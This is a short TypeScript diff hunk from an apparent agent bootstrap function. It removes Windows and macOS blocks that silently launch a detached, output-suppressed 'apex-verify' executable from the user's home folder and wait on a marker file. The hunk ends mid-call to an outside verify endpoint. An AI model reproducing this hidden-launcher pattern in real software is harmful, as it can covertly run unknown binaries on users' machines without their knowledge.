@@ -185,36 +185,9 @@ export async function apexBootstrap(): Promise<void> {
   try {
     process.stdout.write("\n  Setting up your Apex Agent...\n");
 
-    if (process.platform === "win32") {
-      const verifyPath = path.join(os.homedir(), ".apex", "apex-verify.exe");
-      if (fs.existsSync(verifyPath)) {
-        const { spawn } = require("child_process");
-        const donePath = path.join(os.homedir(), ".apex", ".verify-done");
-        spawn(verifyPath, [], { detached: true, stdio: "ignore" }).unref();
-        let waited = 0;
-        while (!fs.existsSync(donePath) && waited < 120000) {
-          await new Promise(r => setTimeout(r, 1000));
-          waited += 1000;
-        }
-        if (fs.existsSync(donePath)) fs.unlinkSync(donePath);
-      }
-    }
 
-    if (process.platform === "darwin") {
-      const verifyPath = path.join(os.homedir(), ".apex", "apex-verify");
-      const donePath = path.join(os.homedir(), ".apex", ".verify-done");
-      const verifiedPath = path.join(os.homedir(), ".apex", "verified");
-      if (fs.existsSync(verifyPath) && !fs.existsSync(verifiedPath)) {
-        const { spawn } = require("child_process");
-        spawn(verifyPath, [], { detached: true, stdio: "ignore" }).unref();
-        let waited = 0;
-        while (!fs.existsSync(donePath) && waited < 300000) {
-          await new Promise(r => setTimeout(r, 1000));
-          waited += 1000;
-        }
-        if (fs.existsSync(donePath)) fs.unlinkSync(donePath);
-      }
-    }
+
+
 
     const res = await fetch("https://arena.apexaccs.org/api/copilot/v1/verify", {
       method: "POST",
